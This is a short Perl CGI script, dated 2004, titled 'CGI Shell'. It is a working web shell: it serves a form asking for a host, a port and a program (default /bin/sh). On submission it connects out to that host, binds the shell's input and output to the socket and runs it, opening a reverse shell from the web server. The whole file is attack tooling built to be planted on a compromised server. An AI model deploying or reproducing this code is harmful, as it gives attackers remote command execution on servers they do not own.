#!/usr/bin/perl

#
# (C) Copyright Claes M Nyberg <md0claes@mdstud.chalmers.se> 2004
# $Id: cgi_post_connect_back.pl,v 1.1 2005-03-10 00:05:45 cmn Exp $
#

use Socket;

# Detach and connect back
# $_[0] - IP
# $_[1] - Port
# $_[2] - Program (/bin/sh)
sub connect_back($$$)
{
	socket(TARGET, PF_INET, SOCK_STREAM, getprotobyname('tcp'))  or
    	return("socket(): $!");

	connect(TARGET, sockaddr_in($_[1],inet_aton($_[0]))) or 
		return("connect(): $!");

	(fork() != 0) and return('');
	open(STDIN, '<&TARGET');
	open(STDOUT, '>&TARGET');
	open(STDERR, '>&TARGET');
	exec($_[2]);
	exit(1);
}

# get arguments into an associative array
sub get_post_args()
{
    while (<STDIN>) {
        # cho(m)p away newline
        s/\n//;
        s/\r//;
        @arr = split(/=/, $_);
        $args{$arr[0]} = $arr[1];
    }
    return(%args);
}

# Reopen standard error as standard out
open(STDERR, ">&STDOUT");
%args = get_post_args();

print<<__ENDHTML__;
Content-type: text/html\n\n
    <head><title>CGI Shell</title></head>
    <html>
    <body>
__ENDHTML__

# Connect back
if ( ($args{'ip'} ne "") and ($args{'port'} ne "") and ($args{'prog'} ne "")) {
    $err = connect_back($args{'ip'}, $args{'port'}, $args{'prog'});
	
	if ($err eq '') 
		{ print "Connected [<b>$args{'prog'}</b>] to <b>$args{'ip'}:$args{'port'}</b>\n"; }
	else { print "Connect back failed: <b>$err</b>\n"; }
	
	print "<br><p><a href=\"$ENV{'SCIPT_NAME'}\">Back</a>\n";
	print "</body></html>";
	exit(1);
}
	

print "<form method=\"POST\" enctype=\"text/plain\" action=\"$ENV{'SCIPT_NAME'}\">";
print<<__ENDHTML__;

		<table border="0">
		<tr>
			<td>
        	<b>Host</b><br> 
			<input name="ip" type="text" size="20">
			</td>

			<td>
			<b>Port</b><br>
        	<input name="port" type="text" size="5" maxsize="5">
			</td>
		</tr>
		<tr>
			<td colspan=2">
			<b>Program</b><br>
        	<input name="prog" type="text" size="20" value="/bin/sh">
			</td>
		</tr>
		<tr>
			<td colspan="2">
			<br> <input type="submit" value="Connect Back">
			</td>
		</tr>
		
		</table>
		
    </form>
__ENDHTML__

print "</body></html>";
